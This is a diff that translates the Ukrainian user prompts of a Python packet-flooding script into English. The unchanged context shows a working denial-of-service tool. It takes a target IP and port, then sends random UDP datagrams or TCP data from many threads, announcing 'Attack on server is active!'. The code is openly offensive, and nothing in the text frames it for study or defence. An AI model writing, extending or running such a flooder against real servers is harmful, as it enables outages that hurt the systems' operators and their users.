@@ -7,22 +7,22 @@ import sys
 import os
 from os import system, name
 
-print("Введіть будь який символ")
+print("Enter any character")
 
 
 test = input()
 if test == "n":
 	exit(0)
 print("\033[H\033[J")
-ip = str(input("Введіть ip(в цифровому вигляді): "))
+ip = str(input("Enter IP address: "))
 print("\033[H\033[J")
-port = int(input("Введіть порт: "))
+port = int(input("Enter port: "))
 print("\033[H\033[J")
-choice = str(input("Напишить букву 'y'(на англійській): "))
+choice = str(input("Type 'y' for UDP or anything else for TCP: "))
 print("\033[H\033[J")
-times = int(input("Кількість пакетів:"))
+times = int(input("Number of packets: "))
 print("\033[H\033[J")
-threads = int(input("Кількість користувачів: "))
+threads = int(input("Number of threads: "))
 def run():
 	data = random._urandom(1024)
 	i = random.choice(("[*]","[!]","[#]"))
@@ -32,10 +32,10 @@ def run():
 			addr = (str(ip),int(port))
 			for x in range(times):
 				s.sendto(data,addr)
-			print(i +"Атака на сервер увімкнена!")
+			print(i +"Attack on server is active!")
 		except:
 			s.close()
-			print("Помилка")
+			print("Error")
 
 def run2():
 	data = random._urandom(16)
@@ -47,10 +47,10 @@ def run2():
 			s.send(data)
 			for x in range(times):
 				s.send(data)
-			print(i +"Атака на сервер увімкнена")
+			print(i +"Attack on server is active")
 		except:
 			s.close()
-			print("Помилка")
+			print("Error")
 
 for y in range(threads):
 	if choice == 'y':
@@ -70,8 +70,8 @@ def new():
 			th.start()
 
 def whereuwere():
-    print("Вибачте, але я можу атакувати тільки TCP чи UDP")
-    print("Напишіть 1 для UDP чи 2 для TCP")
+    print("Sorry, I can only use TCP or UDP")
+    print("Type 1 for UDP or 2 for TCP")
     whereman = str(input(" 1 or 2 >:("))
     if whereman == '1':
         run()
@@ -93,7 +93,7 @@ def exit_gracefully(signum, frame):
     signal.signal(signal.SIGINT, original_sigint)
 
     try:
-        exitc = str(input("Бажаєш вийти?(y чи n): "))
+        exitc = str(input("Do you want to exit? (y or n): "))
         if exitc == 'y':
             byebye()
 
